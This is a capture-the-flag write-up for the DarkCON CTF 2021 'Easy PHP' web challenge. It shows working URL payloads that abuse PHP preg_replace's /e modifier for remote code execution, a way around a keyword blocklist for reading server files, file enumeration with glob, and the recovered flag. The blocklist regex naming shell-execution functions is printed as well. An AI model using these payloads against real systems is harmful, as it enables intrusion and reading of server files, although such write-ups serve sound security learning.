<h1>DarkCON CTF 2021 â€“ Easy PHP</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 384</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Please note....</p>
  
  <p>Note: This chall does not require any brute forcing</p>
  
  <p>http://easy-php.darkarmy.xyz/</p>
</blockquote>

<h2>Solution</h2>

<p>The normal webpage returns a welcome advice.</p>

<p><code>
Welcome DarkCON CTF !!
</code></p>

<p>But connecting to <code>http://easy-php.darkarmy.xyz/robots.txt</code> will reveal the following content.</p>

<p><code>
?lmao
</code></p>

<p>So you can connect to <code>http://easy-php.darkarmy.xyz/?lmao</code> which will return the following PHP code.</p>

<p>```php
<?php
require_once 'config.php';</p>

<p>$text = "Welcome DarkCON CTF !!";</p>

<p>if (isset($<em>GET['lmao'])) {
    highlight</em>file(<strong>FILE</strong>);
    exit;
}
else {
    $payload = $<em>GET['bruh'];
    if (isset($payload)) {
        if (is</em>payload<em>danger($payload)) {
            die("Amazing Goob JOb You :) ");
        }
        else {
            echo preg</em>replace($_GET['nic3'], $payload, $text);
        }
    }
    echo $text;
}
?>
```</p>

<p>Basically you can craft your own <code>preg_replace</code>. For example, connecting to <code>http://easy-php.darkarmy.xyz/?bruh=test&amp;nic3=/DarkCON/</code> will give you the following.</p>

<p><code>
Welcome test CTF !!Welcome DarkCON CTF !!
</code></p>

<p>The <a href="https://medium.com/@roshancp/command-execution-preg-replace-php-function-exploit-62d6f746bda4"><code>preg_replace</code> is subject to RCE using <code>/e</code></a>.</p>

<p><code>http://easy-php.darkarmy.xyz/?bruh=phpinfo()&amp;nic3=/DarkCON/e</code> will return the <code>phpinfo()</code> output.</p>

<p>But <code>http://easy-php.darkarmy.xyz/?bruh=system(%27id%27)&amp;nic3=/DarkCON/e</code> will be blocked by the <code>is_payload_danger</code> method.</p>

<p>With some analysis, you can discover that <code>fread</code> and <code>fopen</code> are available, so you can read <code>config.php</code> with a payload like the following, specifying the <code>config.php</code> filename in another GET parameter to bypass the check.</p>

<p>```
base64<em>encode(fread(fopen($</em>GET['pwn'],'r'),512))</p>

<p>http://easy-php.darkarmy.xyz/?bruh=base64<em>encode(fread(fopen($</em>GET[%27pwn%27],%27r%27),512))&amp;nic3=/DarkCON/e&amp;pwn=config.php
```</p>

<p>The response is the following.</p>

<p><code>
Welcome PD9waHAKZnVuY3Rpb24gaXNfcGF5bG9hZF9kYW5nZXIoJHBheWxvYWQpIHsKCXJldHVybiBwcmVnX21hdGNoKCcvZXhlY3xwYXNzdGhydXxzaGVsbF9leGVjfHN5c3RlbXxwcm9jX29wZW58cG9wZW58Y3VybF9leGVjfGN1cmxfbXVsdGlfZXhlY3xwYXJzZV9pbmlfZmlsZXxyZWFkZmlsZXxyZXF1aXJlfHJlcXVpcmVfb25jZXxpbmNsdWRlfGluY2x1ZGVfb25jZXxwcmludHxmaW5kfGZpbGV8YHxjb25maWd8dmFyX2R1bXB8ZGlyLycsJHBheWxvYWQpOwp9Cj8+Cg== CTF !!Welcome DarkCON CTF !!
</code></p>

<p>Decoding the base64, you can discover the source code.</p>

<p><code>php
&lt;?php
function is_payload_danger($payload) {
    return preg_match('/exec|passthru|shell_exec|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|readfile|require|require_once|include|include_once|print|find|file|`|config|var_dump|dir/',$payload);
}
?&gt;
</code></p>

<p>Using <code>glob</code> function, which is not blocked, you can find an interesting file.</p>

<p><code>
http://easy-php.darkarmy.xyz/?bruh=glob(%22*.php%22)[1]&amp;nic3=/DarkCON/e
</code></p>

<p><code>
Welcome flag210d9f88fd1db71b947fbdce22871b57.php CTF !!Welcome DarkCON CTF !!
</code></p>

<p>You can read that file with the technique used before.</p>

<p><code>
http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&amp;nic3=/DarkCON/e&amp;pwn=flag210d9f88fd1db71b947fbdce22871b57.php
</code></p>

<p><code>
Welcome ZGFya0NPTnt3M2xjMG1lX0Q0cmtDMG5fQ1RGXzJPMjFfZ2d3cCEhISF9Cg== CTF !!Welcome DarkCON CTF !!
</code></p>

<p>Decoding the base64 you can discover the flag.</p>

<p><code>
darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}
</code></p>
